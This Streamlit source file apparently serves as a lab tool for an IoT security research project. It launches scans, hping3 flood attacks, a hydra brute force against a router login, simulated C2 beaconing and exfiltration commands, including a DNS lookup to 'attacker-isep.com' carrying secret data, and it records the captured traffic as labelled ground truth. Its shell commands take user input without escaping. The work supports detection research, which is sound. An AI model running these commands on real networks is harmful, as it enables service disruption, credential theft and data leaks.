import streamlit as st
import subprocess
import time
import json
import os
import pandas as pd
from datetime import datetime
from collections import Counter

# Cliente para comunicar com o agente de captura no router
try:
    from router_client import RouterAgent
    ROUTER_CLIENT_AVAILABLE = True
except ImportError:
    ROUTER_CLIENT_AVAILABLE = False

# --- ATIVAR MODO PROMÍSCUO EM TODAS AS INTERFACES (uma vez por sessão) ---
def enable_promiscuous_all():
    activated = []
    try:
        interfaces = [i for i in os.listdir("/sys/class/net/") if i != "lo"]
        for iface in interfaces:
            subprocess.run(
                ["sudo", "ip", "link", "set", iface, "promisc", "on"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            activated.append(iface)
    except Exception:
        pass
    return activated

# Executa apenas uma vez por sessão (não repete a cada refresh)
if "promisc_done" not in st.session_state:
    st.session_state.promisc_activated = enable_promiscuous_all()
    st.session_state.promisc_done = True

# --- CONFIGURAÇÃO DA PÁGINA ---
st.set_page_config(
    page_title="ISEP Attack Framework",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded"
)

# --- CSS PROFISSIONAL CORPORATIVO ---
st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap');
    
    :root {
        --primary-dark: #0a1929;
        --primary-blue: #1e3a5f;
        --accent-blue: #2563eb;
        --accent-cyan: #06b6d4;
        --text-primary: #e2e8f0;
        --text-secondary: #94a3b8;
        --success: #10b981;
        --warning: #f59e0b;
        --danger: #ef4444;
        --card-bg: #132f4c;
        --border-color: #1e3a5f;
    }
    
    .stApp {
        background: linear-gradient(135deg, #0a1929 0%, #0f2942 100%);
        font-family: 'Inter', sans-serif;
    }
    
    .main-header {
        background: linear-gradient(90deg, #0a1929 0%, #1e3a5f 100%);
        padding: 2rem 2.5rem;
        border-radius: 12px;
        border-left: 4px solid #2563eb;
        margin-bottom: 2rem;
        box-shadow: 0 8px 32px rgba(0,0,0,0.3);
    }
    
    .main-header h1 {
        color: #ffffff;
        font-size: 2rem;
        font-weight: 700;
        margin: 0;
        letter-spacing: -0.02em;
    }
    
    .main-header .subtitle {
        color: #94a3b8;
        font-size: 0.95rem;
        margin-top: 0.5rem;
        font-weight: 400;
    }
    
    .main-header .badge {
        display: inline-block;
        background: rgba(37, 99, 235, 0.15);
        color: #60a5fa;
        padding: 0.25rem 0.75rem;
        border-radius: 6px;
        font-size: 0.75rem;
        font-weight: 600;
        letter-spacing: 0.05em;
        margin-top: 0.75rem;
        border: 1px solid rgba(37, 99, 235, 0.3);
    }
    
    .metric-card {
        background: linear-gradient(135deg, #132f4c 0%, #1a3a5f 100%);
        padding: 1.5rem;
        border-radius: 10px;
        border: 1px solid #1e3a5f;
        transition: all 0.3s ease;
        height: 100%;
    }
    
    .metric-card:hover {
        border-color: #2563eb;
        transform: translateY(-2px);
        box-shadow: 0 12px 24px rgba(37, 99, 235, 0.15);
    }
    
    .metric-label {
        color: #94a3b8;
        font-size: 0.75rem;
        font-weight: 600;
        letter-spacing: 0.08em;
        text-transform: uppercase;
        margin-bottom: 0.5rem;
    }
    
    .metric-value {
        color: #ffffff;
        font-size: 2rem;
        font-weight: 700;
        font-family: 'JetBrains Mono', monospace;
        line-height: 1;
    }
    
    .metric-delta {
        color: #10b981;
        font-size: 0.8rem;
        margin-top: 0.5rem;
        font-weight: 500;
    }
    
    .status-dot {
        display: inline-block;
        width: 8px;
        height: 8px;
        border-radius: 50%;
        margin-right: 0.5rem;
        animation: pulse 2s infinite;
    }
    
    .status-active { background: #10b981; box-shadow: 0 0 8px #10b981; }
    .status-idle { background: #f59e0b; box-shadow: 0 0 8px #f59e0b; }
    .status-offline { background: #64748b; }
    
    @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.5; }
    }
    
    .stTabs [data-baseweb="tab-list"] {
        gap: 0.5rem;
        background: rgba(19, 47, 76, 0.5);
        padding: 0.5rem;
        border-radius: 10px;
        border: 1px solid #1e3a5f;
    }
    
    .stTabs [data-baseweb="tab"] {
        background: transparent;
        color: #94a3b8;
        border-radius: 6px;
        padding: 0.5rem 1.2rem;
        font-weight: 500;
        font-size: 0.9rem;
        transition: all 0.2s;
    }
    
    .stTabs [aria-selected="true"] {
        background: #2563eb !important;
        color: #ffffff !important;
    }
    
    .stButton > button {
        background: linear-gradient(135deg, #1e3a5f 0%, #2563eb 100%);
        color: #ffffff;
        border: 1px solid #2563eb;
        border-radius: 8px;
        padding: 0.6rem 1.2rem;
        font-weight: 600;
        font-size: 0.85rem;
        letter-spacing: 0.02em;
        transition: all 0.2s;
        width: 100%;
    }
    
    .stButton > button:hover {
        background: linear-gradient(135deg, #2563eb 0%, #3b82f6 100%);
        border-color: #60a5fa;
        transform: translateY(-1px);
        box-shadow: 0 6px 16px rgba(37, 99, 235, 0.4);
    }
    
    [data-testid="stSidebar"] {
        background: #0a1929;
        border-right: 1px solid #1e3a5f;
    }
    
    [data-testid="stSidebar"] h1, [data-testid="stSidebar"] h2, [data-testid="stSidebar"] h3 {
        color: #ffffff;
    }
    
    .stTextInput input {
        background: #0a1929 !important;
        color: #ffffff !important;
        border: 1px solid #1e3a5f !important;
        border-radius: 6px !important;
        font-family: 'JetBrains Mono', monospace !important;
    }
    
    .stTextInput input:focus {
        border-color: #2563eb !important;
        box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.2) !important;
    }
    
    .section-title {
        color: #ffffff;
        font-size: 1.1rem;
        font-weight: 600;
        margin: 1.5rem 0 1rem 0;
        padding-bottom: 0.5rem;
        border-bottom: 1px solid #1e3a5f;
        letter-spacing: 0.02em;
    }
    
    .section-title .icon {
        color: #60a5fa;
        margin-right: 0.5rem;
    }
    
    .attack-info {
        background: rgba(19, 47, 76, 0.4);
        border-left: 3px solid #60a5fa;
        padding: 0.75rem 1rem;
        border-radius: 6px;
        margin-bottom: 1rem;
        color: #cbd5e1;
        font-size: 0.85rem;
    }
    
    .log-entry {
        background: #132f4c;
        border: 1px solid #1e3a5f;
        border-left: 3px solid #10b981;
        padding: 1rem;
        border-radius: 6px;
        margin-bottom: 0.75rem;
        font-family: 'JetBrains Mono', monospace;
        font-size: 0.82rem;
    }
    
    .log-entry .timestamp {
        color: #94a3b8;
        font-size: 0.75rem;
    }
    
    .log-entry .attack-type {
        color: #60a5fa;
        font-weight: 600;
        margin: 0.25rem 0;
    }
    
    .log-entry .target {
        color: #f59e0b;
    }
    
    #MainMenu, footer, header {visibility: hidden;}
    
    .phase-badge {
        display: inline-block;
        padding: 0.2rem 0.6rem;
        border-radius: 4px;
        font-size: 0.7rem;
        font-weight: 600;
        letter-spacing: 0.05em;
        margin-right: 0.5rem;
    }
    
    .phase-1 { background: rgba(96, 165, 250, 0.15); color: #60a5fa; border: 1px solid #60a5fa; }
    .phase-2 { background: rgba(245, 158, 11, 0.15); color: #f59e0b; border: 1px solid #f59e0b; }
    .phase-3 { background: rgba(239, 68, 68, 0.15); color: #ef4444; border: 1px solid #ef4444; }
    .phase-4 { background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid #10b981; }
    
    /* Barra de distribuição customizada */
    .distribution-bar-container {
        background: #132f4c;
        border-radius: 8px;
        padding: 1rem;
        margin-bottom: 0.6rem;
        border: 1px solid #1e3a5f;
    }
    
    .distribution-bar-label {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 0.5rem;
    }
    
    .distribution-bar-name {
        color: #cbd5e1;
        font-size: 0.85rem;
        font-weight: 500;
    }
    
    .distribution-bar-count {
        color: #60a5fa;
        font-weight: 700;
        font-family: 'JetBrains Mono', monospace;
    }
    
    .distribution-bar-track {
        background: #0a1929;
        border-radius: 4px;
        height: 8px;
        overflow: hidden;
    }
    
    .distribution-bar-fill {
        height: 100%;
        background: linear-gradient(90deg, #2563eb 0%, #60a5fa 100%);
        border-radius: 4px;
        transition: width 0.3s ease;
    }
</style>
""", unsafe_allow_html=True)

# --- HEADER ---
st.markdown("""
<div class="main-header">
    <h1>🛡️ ISEP Attack Framework</h1>
    <div class="subtitle">IoT Network Security Testing Platform — Red Team Operations</div>
    <div class="badge">SoftCPS Research Lab</div>
</div>
""", unsafe_allow_html=True)

# --- SIDEBAR ---
with st.sidebar:
    st.markdown("### ⚙️ Network Configuration")
    target_ip = st.text_input("Target IP (Router)", value="192.168.1.1")
    interface = st.text_input("Injection Interface", value="eth1")
    monitor_interface = st.text_input("Monitoring Interface", value="eth0")
    target_subnet = st.text_input("Target Subnet", value="192.168.1.0/24")

    st.divider()
    st.markdown("### 🎯 Capture Mode")
    capture_mode = st.radio(
        "Where to capture traffic?",
        ["Local (this machine)", "Router (remote agent)"],
        help="Local: captura na interface desta máquina. Router: o agente no router captura todo o tráfego (cabo + Wi-Fi).",
    )

    # Configuração do router (só aparece se escolher modo Router)
    router_host = target_ip
    router_port = 9999
    if capture_mode == "Router (remote agent)":
        router_host = st.text_input("Router Agent IP", value=target_ip)
        router_port = st.number_input("Router Agent Port", value=9999, min_value=1, max_value=65535)

        # Botão para testar a ligação ao agente
        if st.button("🔌 Test Agent Connection", use_container_width=True):
            if ROUTER_CLIENT_AVAILABLE:
                agent = RouterAgent(router_host, int(router_port))
                if agent.ping():
                    st.success("✅ Agente do router está ativo!")
                else:
                    st.error("❌ Agente não responde. Está a correr no router?")
            else:
                st.error("Módulo router_client.py não encontrado.")
    
    st.divider()
    st.markdown("### 🔧 System Actions")
    
    if st.button("🔄 Refresh Dashboard", use_container_width=True):
        st.rerun()
    
    if st.button("🗑️ Clear Log History", use_container_width=True):
        if os.path.exists("attack_log.json"):
            os.remove("attack_log.json")
            st.success("Logs cleared!")
            st.rerun()
    
    if st.button("🧹 Clear PCAP Files", use_container_width=True):
        try:
            subprocess.run("sudo rm -f /tmp/ataque_*.pcap", shell=True)
            st.success("PCAPs cleared!")
            st.rerun()
        except Exception as e:
            st.error(f"Error: {e}")
    
    st.divider()
    promisc_list = st.session_state.get("promisc_activated", [])
    if promisc_list:
        st.markdown(f"""
        <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981; border-radius: 6px; padding: 0.6rem 0.8rem; font-size: 0.75rem; color: #10b981;">
            ✅ <strong>Promiscuous Mode ON</strong><br>
            <span style="color: #94a3b8;">{', '.join(promisc_list)}</span>
        </div>
        """, unsafe_allow_html=True)

    st.markdown("""
    <div style="color: #64748b; font-size: 0.75rem; text-align: center; padding: 1rem 0;">
        <strong>ISEP / SoftCPS</strong><br>
        Internship Project 2026
    </div>
    """, unsafe_allow_html=True)

# --- FUNÇÕES AUXILIARES ---
def get_logs():
    if os.path.exists("attack_log.json"):
        with open("attack_log.json", "r") as f:
            return [json.loads(line) for line in f.readlines()]
    return []

def check_interface_status(iface):
    try:
        result = subprocess.run(
            ["ip", "link", "show", iface],
            capture_output=True, text=True, timeout=2
        )
        if "UP" in result.stdout:
            return "active"
        return "idle"
    except:
        return "offline"

def log_attack(attack_type, variant, start_time, end_time, pcap_file):
    entry = {
        "timestamp_start": start_time,
        "timestamp_end": end_time,
        "attack": attack_type,
        "variant": variant,
        "target": target_ip,
        "pcap_generated": pcap_file,
        "status": "SUCCESS"
    }
    with open("attack_log.json", "a") as f:
        f.write(json.dumps(entry) + "\n")

def run_command(cmd, attack_type, variant):
    timestamp_id = int(time.time())
    pcap_name = f"ataque_{variant}_{timestamp_id}.pcap"
    pcap_path = f"/tmp/{pcap_name}"

    start_dt = datetime.now()
    start_iso = start_dt.isoformat()

    status_text = st.empty()

    # ===================================================================
    # MODO ROUTER — a captura é feita pelo agente no router (cabo + Wi-Fi)
    # ===================================================================
    if capture_mode == "Router (remote agent)":
        if not ROUTER_CLIENT_AVAILABLE:
            st.error("Módulo router_client.py não encontrado. Coloca-o na mesma pasta.")
            return

        agent = RouterAgent(router_host, int(router_port))

        try:
            # 0. Verificar que o agente está vivo
            status_text.info("🔌 A contactar o agente do router...")
            if not agent.ping():
                st.error("❌ Agente do router não responde. Verifica a ligação.")
                return

            # 1. Pedir ao router para iniciar a captura
            status_text.info(f"🛰️ Router a iniciar captura ({variant})...")
            resp = agent.start_capture(variant)
            if not resp.startswith("OK"):
                st.error(f"Erro ao iniciar captura no router: {resp}")
                return

            time.sleep(3)  # margem para o tcpdump estabilizar no router

            # 2. Injetar o ataque (a partir desta máquina)
            status_text.warning(f"⚔️ A injetar {variant} via {interface}...")
            process = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            time.sleep(2)

            # 3. Pedir ao router para parar a captura
            status_text.info("🏁 Router a finalizar captura...")
            agent.stop_capture()
            time.sleep(2)

            # 4. Descarregar o PCAP do router para esta máquina
            status_text.info("⬇️ A descarregar PCAP do router...")
            ok, msg = agent.get_pcap(variant, pcap_path)
            if not ok:
                st.warning(f"Captura feita, mas falha ao descarregar PCAP: {msg}")

            # 5. Registar Ground Truth
            end_iso = datetime.now().isoformat()
            log_attack(attack_type, variant, start_iso, end_iso, pcap_name)

            status_text.success(f"✅ Experiment Complete (Router) — PCAP: {pcap_name}")
            st.toast(f"Attack {variant} finished (router capture)!", icon="✅")

            with st.expander("📋 Command Output Details", expanded=True):
                if process.stdout:
                    st.code(process.stdout)
                else:
                    st.write("Command executed silently — check PCAP file.")
                st.caption(f"Router capture: {msg}")

            st.info("💡 Click **'🔄 Refresh Dashboard'** in the sidebar to update metrics and logs.")

        except Exception as e:
            st.error(f"Erro na orquestração (modo router): {e}")
        return

    # ===================================================================
    # MODO LOCAL — captura na interface desta máquina (comportamento original)
    # ===================================================================
    try:
        status_text.info(f"🛰️ Starting capture on {monitor_interface}...")
        tshark_proc = subprocess.Popen([
            "sudo", "tshark", "-i", monitor_interface, "-w", pcap_path
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        time.sleep(5)

        status_text.warning(f"⚔️ Injecting {variant} via {interface}...")
        process = subprocess.run(cmd, shell=True, capture_output=True, text=True)

        time.sleep(2)
        status_text.info("🏁 Finalizing capture...")
        tshark_proc.terminate()
        time.sleep(3)

        subprocess.run(["sudo", "chown", "kali:kali", pcap_path])

        end_iso = datetime.now().isoformat()
        log_attack(attack_type, variant, start_iso, end_iso, pcap_name)

        status_text.success(f"✅ Experiment Complete — PCAP: {pcap_name}")
        st.toast(f"Attack {variant} finished!", icon="✅")

        with st.expander("📋 Command Output Details", expanded=True):
            if process.stdout:
                st.code(process.stdout)
            else:
                st.write("Command executed silently — check PCAP file.")

        st.info("💡 Click **'🔄 Refresh Dashboard'** in the sidebar to update metrics and logs.")

    except Exception as e:
        st.error(f"Orchestration error: {e}")

# --- MÉTRICAS DASHBOARD ---
logs = get_logs()
total_attacks = len(logs)
unique_variants = len(set(log['variant'] for log in logs)) if logs else 0
last_attack = logs[-1]['variant'] if logs else "None"
pcap_count = 0
if os.path.exists("/tmp"):
    pcap_count = len([f for f in os.listdir("/tmp") if f.startswith("ataque_") and f.endswith(".pcap")])

col1, col2, col3, col4 = st.columns(4)

with col1:
    st.markdown(f"""
    <div class="metric-card">
        <div class="metric-label">Total Attacks</div>
        <div class="metric-value">{total_attacks}</div>
        <div class="metric-delta">Logged events</div>
    </div>
    """, unsafe_allow_html=True)

with col2:
    st.markdown(f"""
    <div class="metric-card">
        <div class="metric-label">Unique Variants</div>
        <div class="metric-value">{unique_variants}</div>
        <div class="metric-delta">Of 12+ available</div>
    </div>
    """, unsafe_allow_html=True)

with col3:
    st.markdown(f"""
    <div class="metric-card">
        <div class="metric-label">PCAP Files</div>
        <div class="metric-value">{pcap_count}</div>
        <div class="metric-delta">In /tmp/</div>
    </div>
    """, unsafe_allow_html=True)

with col4:
    st.markdown(f"""
    <div class="metric-card">
        <div class="metric-label">Last Operation</div>
        <div class="metric-value" style="font-size: 1rem; padding-top: 0.7rem;">{last_attack}</div>
        <div class="metric-delta">Most recent</div>
    </div>
    """, unsafe_allow_html=True)

# --- STATUS DAS INTERFACES ---
st.markdown('<div class="section-title"><span class="icon">📡</span> Network Interfaces Status</div>', unsafe_allow_html=True)

inj_status = check_interface_status(interface)
mon_status = check_interface_status(monitor_interface)

status_col1, status_col2 = st.columns(2)

with status_col1:
    status_class = f"status-{inj_status}"
    status_label = {"active": "ACTIVE", "idle": "IDLE", "offline": "OFFLINE"}[inj_status]
    st.markdown(f"""
    <div class="metric-card">
        <div class="metric-label">Injection Interface</div>
        <div style="display: flex; align-items: center; margin-top: 0.5rem;">
            <span class="status-dot {status_class}"></span>
            <span style="color: #ffffff; font-family: 'JetBrains Mono', monospace; font-size: 1.2rem; font-weight: 600;">{interface}</span>
            <span style="margin-left: auto; color: #94a3b8; font-size: 0.8rem;">{status_label}</span>
        </div>
        <div style="color: #64748b; font-size: 0.75rem; margin-top: 0.5rem;">Role: Attack Traffic Generator</div>
    </div>
    """, unsafe_allow_html=True)

with status_col2:
    status_class = f"status-{mon_status}"
    status_label = {"active": "ACTIVE", "idle": "IDLE", "offline": "OFFLINE"}[mon_status]
    st.markdown(f"""
    <div class="metric-card">
        <div class="metric-label">Monitoring Interface</div>
        <div style="display: flex; align-items: center; margin-top: 0.5rem;">
            <span class="status-dot {status_class}"></span>
            <span style="color: #ffffff; font-family: 'JetBrains Mono', monospace; font-size: 1.2rem; font-weight: 600;">{monitor_interface}</span>
            <span style="margin-left: auto; color: #94a3b8; font-size: 0.8rem;">{status_label}</span>
        </div>
        <div style="color: #64748b; font-size: 0.75rem; margin-top: 0.5rem;">Role: Passive Traffic Capture</div>
    </div>
    """, unsafe_allow_html=True)

# --- DISTRIBUIÇÃO DE ATAQUES (Barras horizontais customizadas) ---
if logs:
    st.markdown('<div class="section-title"><span class="icon">📊</span> Attack Distribution</div>', unsafe_allow_html=True)
    
    chart_col1, chart_col2 = st.columns(2)
    
    with chart_col1:
        st.markdown("<div style='color: #94a3b8; font-size: 0.75rem; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 0.75rem;'>BY ATTACK CATEGORY</div>", unsafe_allow_html=True)
        attack_counts = Counter(log['attack'] for log in logs)
        max_count = max(attack_counts.values()) if attack_counts else 1
        
        for attack, count in attack_counts.most_common():
            percentage = (count / max_count) * 100
            st.markdown(f"""
            <div class="distribution-bar-container">
                <div class="distribution-bar-label">
                    <span class="distribution-bar-name">{attack}</span>
                    <span class="distribution-bar-count">{count}</span>
                </div>
                <div class="distribution-bar-track">
                    <div class="distribution-bar-fill" style="width: {percentage}%;"></div>
                </div>
            </div>
            """, unsafe_allow_html=True)
    
    with chart_col2:
        st.markdown("<div style='color: #94a3b8; font-size: 0.75rem; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 0.75rem;'>TOP VARIANTS</div>", unsafe_allow_html=True)
        variant_counts = Counter(log['variant'] for log in logs)
        max_var = max(variant_counts.values()) if variant_counts else 1
        
        for variant, count in variant_counts.most_common(5):
            percentage = (count / max_var) * 100
            st.markdown(f"""
            <div class="distribution-bar-container">
                <div class="distribution-bar-label">
                    <span class="distribution-bar-name" style="font-family: 'JetBrains Mono', monospace;">{variant}</span>
                    <span class="distribution-bar-count">{count}</span>
                </div>
                <div class="distribution-bar-track">
                    <div class="distribution-bar-fill" style="width: {percentage}%; background: linear-gradient(90deg, #06b6d4 0%, #60a5fa 100%);"></div>
                </div>
            </div>
            """, unsafe_allow_html=True)

# --- TABS ATAQUES ---
st.markdown('<div class="section-title"><span class="icon">⚔️</span> Attack Arsenal</div>', unsafe_allow_html=True)

tab1, tab2, tab3, tab4, tab5, tab6 = st.tabs([
    "🔍 Vertical Scan", "🌐 Horizontal Scan", "💣 DDoS/Flood", "🔑 Brute Force", "📡 Beaconing", "📤 Exfiltration"
])

with tab1:
    st.markdown('<span class="phase-badge phase-1">PHASE 1 — RECONNAISSANCE</span>', unsafe_allow_html=True)
    st.markdown('<div class="attack-info">Vertical scanning techniques targeting the gateway router to identify open ports and services.</div>', unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: SYN Scan", key="v_syn"):
        run_command(f"sudo nmap -e {interface} -sS -p 1-1024 {target_ip}", "Port Scan", "SYN-Vertical")
    if col2.button("V2: Connect Scan", key="v_connect"):
        run_command(f"sudo nmap -e {interface} -sT -p 1-1024 {target_ip}", "Port Scan", "Connect-Vertical")
    if col3.button("V3: UDP Scan", key="v_udp"):
        run_command(f"sudo nmap -e {interface} -sU -p 53,161,1900 {target_ip}", "Port Scan", "UDP-Vertical")

with tab2:
    st.markdown('<span class="phase-badge phase-1">PHASE 1 — RECONNAISSANCE</span>', unsafe_allow_html=True)
    st.markdown('<div class="attack-info">Horizontal scanning across the LAN subnet to enumerate active hosts and services.</div>', unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: Ping Sweep", key="h_ping"):
        run_command(f"sudo nmap -e {interface} -sn {target_subnet}", "Network Scan", "Ping-Sweep")
    if col2.button("V2: Web Sweep", key="h_web"):
        run_command(f"sudo nmap -e {interface} -sS -p 80,443 {target_subnet}", "Network Scan", "Web-Discovery")
    if col3.button("V3: OS Fingerprinting", key="h_os"):
        st.warning("⚠️ This attack may take several minutes.")
        run_command(f"sudo nmap -e {interface} -O --osscan-limit {target_subnet}", "Network Scan", "OS-Fingerprinting")

with tab3:
    st.markdown('<span class="phase-badge phase-3">PHASE 3 — IMPACT</span>', unsafe_allow_html=True)
    st.markdown('<div class="attack-info">Volumetric Denial-of-Service attacks designed to exhaust network resources (Duration: 15s).</div>', unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: SYN Flood", key="d_syn"):
        run_command(f"sudo timeout 15 hping3 -S --flood -V -p 80 --rand-source -I {interface} {target_ip}", "DDoS", "SYN-Flood")
    if col2.button("V2: UDP Flood", key="d_udp"):
        run_command(f"sudo timeout 15 hping3 --udp --flood -V -p 53 --rand-source -I {interface} {target_ip}", "DDoS", "UDP-Flood")
    if col3.button("V3: ICMP Flood", key="d_icmp"):
        run_command(f"sudo timeout 15 hping3 -1 --flood -V --rand-source -I {interface} {target_ip}", "DDoS", "ICMP-Flood")

with tab4:
    st.markdown('<span class="phase-badge phase-2">ACCESS PHASE</span>', unsafe_allow_html=True)
    st.markdown('<div class="attack-info">HTTP-based credential brute force against the router web administration interface.</div>', unsafe_allow_html=True)
    
    if st.button("Execute HTTP Brute Force", key="bf_http"):
        run_command(f"hydra -l admin -P /usr/share/wordlists/fasttrack.txt -t 4 {target_ip} http-get /:F=failed", "Brute Force", "HTTP-Login")

with tab5:
    st.markdown('<span class="phase-badge phase-2">PHASE 2 — COMMAND & CONTROL</span>', unsafe_allow_html=True)
    st.markdown('<div class="attack-info">Periodic heartbeat signals simulating Command & Control (C2) communications (Duration: 60s).</div>', unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: ICMP Heartbeat", key="b_icmp"):
        run_command(f"sudo timeout 65 ping -I {interface} -i 5 -c 12 {target_ip}", "Beaconing", "ICMP-Periodic")
    if col2.button("V2: DNS Beaconing", key="b_dns"):
        run_command(f"sudo timeout 65 hping3 --udp -p 53 -i 10 -c 6 -I {interface} {target_ip}", "Beaconing", "UDP-DNS-C2")
    if col3.button("V3: HTTP Beaconing", key="b_http"):
        cmd_http = f"sudo timeout 80 bash -c 'for i in {{1..4}}; do echo \"[$(date +%T)] Sending Beacon $i...\"; curl --interface {interface} --connect-timeout 5 --max-time 10 -s http://{target_ip} > /dev/null; sleep 15; done'"
        run_command(cmd_http, "Beaconing", "HTTP-Web-C2")

with tab6:
    st.markdown('<span class="phase-badge phase-4">PHASE 4 — EXFILTRATION</span>', unsafe_allow_html=True)
    st.markdown('<div class="attack-info">Covert channel data exfiltration techniques using hidden payloads in standard protocols.</div>', unsafe_allow_html=True)
    
    secret_data = st.text_input("🔐 Data to Exfiltrate", value="admin_pass_isep2026")
    col1, col2, col3 = st.columns(3)
    if col1.button("V1: ICMP Stuffed", key="e_icmp"):
        run_command(f"sudo nping {target_ip} --icmp --data-string '{secret_data}' --count 1 -e {interface}", "Exfiltration", "ICMP-Data-Stuffed")
    if col2.button("V2: DNS Tunnel", key="e_dns"):
        clean_data = secret_data.replace(" ", "_")
        run_command(f"nslookup {clean_data}.attacker-isep.com", "Exfiltration", "DNS-Tunneling")
    if col3.button("V3: HTTP Header Leak", key="e_http"):
        cmd_leak = f"curl --interface {interface} -H 'X-Secret-Data: {secret_data}' --connect-timeout 2 -s http://{target_ip} > /dev/null && echo 'Header sent successfully!'"
        run_command(cmd_leak, "Exfiltration", "HTTP-Header-Leak")

# --- GROUND TRUTH LOG ---
gt_col1, gt_col2 = st.columns([5, 1])
with gt_col1:
    st.markdown('<div class="section-title"><span class="icon">📜</span> Ground Truth Repository</div>', unsafe_allow_html=True)
with gt_col2:
    st.markdown("<br>", unsafe_allow_html=True)
    if st.button("🔄 Reload", key="reload_gt", use_container_width=True):
        st.rerun()

if logs:
    st.markdown(f"<div style='color: #94a3b8; font-size: 0.85rem; margin-bottom: 1rem;'>Showing {min(len(logs), 10)} of {len(logs)} logged events (most recent first)</div>", unsafe_allow_html=True)
    
    for log in reversed(logs[-10:]):
        ts_start = log['timestamp_start'].split('T')[1].split('.')[0] if 'T' in log['timestamp_start'] else log['timestamp_start']
        ts_date = log['timestamp_start'].split('T')[0] if 'T' in log['timestamp_start'] else ''
        
        st.markdown(f"""
        <div class="log-entry">
            <div class="timestamp">📅 {ts_date} | ⏱️ {ts_start}</div>
            <div class="attack-type">{log['attack']} — {log['variant']}</div>
            <div style="color: #cbd5e1; font-size: 0.8rem;">
                Target: <span class="target">{log['target']}</span> | 
                PCAP: <span style="color: #94a3b8;">{log['pcap_generated']}</span>
            </div>
        </div>
        """, unsafe_allow_html=True)
else:
    st.markdown("""
    <div style="text-align: center; padding: 3rem; background: rgba(19, 47, 76, 0.3); border-radius: 10px; border: 1px dashed #1e3a5f;">
        <div style="font-size: 3rem; margin-bottom: 1rem;">📭</div>
        <div style="color: #94a3b8; font-size: 0.95rem;">No attacks logged yet</div>
        <div style="color: #64748b; font-size: 0.8rem; margin-top: 0.5rem;">Execute an attack from the arsenal above to populate the Ground Truth</div>
    </div>
    """, unsafe_allow_html=True)

# --- FOOTER ---
st.markdown("""
<div style="margin-top: 3rem; padding: 1.5rem; text-align: center; color: #64748b; font-size: 0.75rem; border-top: 1px solid #1e3a5f;">
    <strong>ISEP Attack Framework</strong> v1.0 — Developed for SoftCPS Research Lab<br>
    MITRE ATT&CK Framework Mapped | CVSS 3.1 Scored | Academic Use Only
</div>
""", unsafe_allow_html=True)
